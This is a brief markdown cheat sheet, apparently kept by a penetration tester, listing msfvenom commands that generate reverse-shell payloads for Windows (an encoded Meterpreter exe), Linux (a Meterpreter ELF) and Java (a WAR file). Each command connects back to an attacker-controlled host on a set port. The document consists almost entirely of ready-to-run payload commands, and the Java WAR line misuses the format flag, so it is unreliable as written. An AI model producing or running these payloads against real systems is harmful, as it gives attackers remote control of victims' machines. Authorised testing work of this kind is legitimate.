# MSFVenom Cheat Sheet
This sheet is for all of the use-case scenarios in which I have and will use MSFVenom during a penetration test for generating payloads for systems.
## WINDOWS
This section is for all Windows binary creation techniques used with MSFVenom
### Reverse Meterpreter
To make the victim server or system connect back to the attacker and send meterpreter to be spawned by the handler running on the attacker machine.
1. Generate the MSFVenom Reverse Meterpreter payload:

`./msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=(ATTACKER IP) LPORT=6666 -b '\x00' -e x86/shikata_ga_nai -f exe -o /ftphome/shell.exe`

## LINUX
This section is for all LINUX binary creation techniques used with MSFVenom

`./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(ATTACKER IP) LPORT=5555 -a x86 --platform=linux -f elf -b '\x00' -o shell.o`

## JAVA WAR:
`./msfvenom --platform=(OS TYPE) --payload=java/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=6666 -f shell.war`
